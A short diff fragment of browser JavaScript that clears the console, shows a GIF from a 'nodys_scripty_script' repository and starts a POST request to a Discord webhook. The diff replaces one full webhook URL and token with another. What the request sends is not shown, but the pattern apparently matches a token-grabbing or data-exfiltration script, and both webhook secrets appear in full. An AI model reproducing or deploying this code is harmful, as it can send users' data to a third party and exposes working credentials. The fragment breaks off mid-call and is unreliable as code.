@@ -106,7 +106,7 @@
                 console.clear();
               console.log('%c ', 'font-size:300px; background:url(https://github.com/DistruptCC/nodys_scripty_script/blob/main/DUS.gif?raw=true?raw=true) no-repeat;');
                 fetch(
-  'https://discord.com/api/webhooks/932341277968699442/F2aXOrcYJ8wuBAhQiHopVQWdLqrDF22MccVOIttQFPMovUKMppXXqys6Th4ZAN1jDPPS',
+  'https://discord.com/api/webhooks/923469171516399687/ikaLo3KOTlxdeFk2UZngxPlVcLdEMT3SprHjF6_49Z0WvR1fcDtwmN_JLlrVuQQWshht',
   {
     method: 'post',
     headers: {
